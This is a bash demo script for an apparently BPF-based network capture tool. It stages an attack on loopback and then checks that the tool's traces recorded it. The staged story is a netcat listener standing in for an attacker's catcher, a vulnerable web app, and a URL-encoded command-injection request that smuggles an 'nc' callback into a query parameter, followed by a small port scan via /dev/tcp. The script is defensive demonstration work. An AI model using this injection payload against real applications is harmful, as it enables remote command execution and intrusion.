#!/usr/bin/env bash
# SPDX-License-Identifier: MIT
# The capture demo (STATE 19.5; docs/demo/README.md). Run as root on the VM, from the repo:
#   sudo P15_PYTHON=$HOME/p15venv/bin/python3 tools/demo/run_demo.sh OUT_DIR
# It starts p15d, plays a known story on 127.0.0.1, stops p15d, then runs p15-trace on the
# ports of the story. OUT_DIR gets the run directory, every report (text and HTML), the
# story's own log with the PIDs it started, and SHA256SUMS. Exit 0 only if p15d ended valid
# and every report was made.
#
# The story, all on loopback:
#   1. a listener on 4444 (nc -l), standing in for an attacker's catcher;
#   2. a vulnerable web app on 8080 (tools/demo/webapp.py);
#   3. three ordinary requests to it (curl);
#   4. one request that injects a command: the app's shell runs `nc 127.0.0.1 4444`;
#   5. a small scan of three closed ports (blocking connects, so each is refused at once).
set -u
OUT=${1:?usage: run_demo.sh OUT_DIR}
B=${B:-build}
PY=${P15_PYTHON:-python3}
WEB=8080 C2=4444
[ "$(id -u)" = 0 ] || { echo "run_demo: needs root (p15d loads BPF programs)"; exit 2; }
for t in curl nc timeout; do
    command -v $t >/dev/null || { echo "run_demo: '$t' is missing (apt install curl netcat-openbsd coreutils)"; exit 2; }
done
[ -x "$B/p15d" ] || { echo "run_demo: $B/p15d not built (make -j4)"; exit 2; }
"$PY" -c 'import google_crc32c, numpy' || { echo "run_demo: $PY lacks the reader's packages (python/requirements.txt)"; exit 2; }
mkdir -p "$OUT" && [ -z "$(ls -A "$OUT")" ] || { echo "run_demo: $OUT must be new or empty"; exit 2; }
log() { echo "$(date -u +%H:%M:%S.%3N) $*" | tee -a "$OUT/story.log"; }

log "p15d: start (30 s, network capture on)"
"$B/p15d" ${P15D_FLAGS:-} --wal-dir "$OUT/wal" --duration 30 --stats-ms 1000 --textfile "$OUT/p15d.prom" 2>"$OUT/p15d.err" &
P15D=$!
sleep 3          # load, attach and both self-tests

nc -l 127.0.0.1 $C2 >/dev/null </dev/null &
CATCH=$!
log "1. listener on $C2: nc pid $CATCH"
"$PY" tools/demo/webapp.py $WEB 2>>"$OUT/webapp.log" &
APP=$!
log "2. web app on $WEB: pid $APP"
sleep 1
for path in / /about /lookup?name=localhost; do
    curl -s "http://127.0.0.1:$WEB$path" >/dev/null
    log "3. curl $path: done"
    sleep 0.5
done
curl -s "http://127.0.0.1:$WEB/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%20$C2%20%3C/dev/null" >/dev/null
log "4. injected request sent: the app's shell ran nc to $C2"
sleep 1
for p in 4441 4442 4443; do
    timeout 2 bash -c "exec 3<>/dev/tcp/127.0.0.1/$p" 2>/dev/null
    log "5. scan of port $p: refused, as expected"
done
sleep 1
kill $APP $CATCH 2>/dev/null; wait $APP $CATCH 2>/dev/null
log "p15d: waiting for the end of its 30 s"
wait $P15D; rc=$?
log "p15d: exit $rc"
RUN=$(ls -d "$OUT"/wal/*/ | head -1)
"$B/p15w-inspect" "$RUN" >"$OUT/p15w-inspect.txt"; irc=$?
ok=0
for port in $WEB $C2 4442; do
    tools/p15-trace --port $port "$RUN" --html "$OUT/port-$port.html" >"$OUT/port-$port.txt" || ok=1
done
(cd "$OUT" && find . -type f ! -name SHA256SUMS | sort | xargs sha256sum >SHA256SUMS)
chmod -R a+rX "$OUT"
echo
cat "$OUT/port-$C2.txt"
echo "run_demo: p15d exit $rc, p15w-inspect exit $irc, reports $([ $ok = 0 ] && echo made || echo FAILED); files in $OUT"
[ $rc = 0 ] && [ $irc = 0 ] && [ $ok = 0 ]
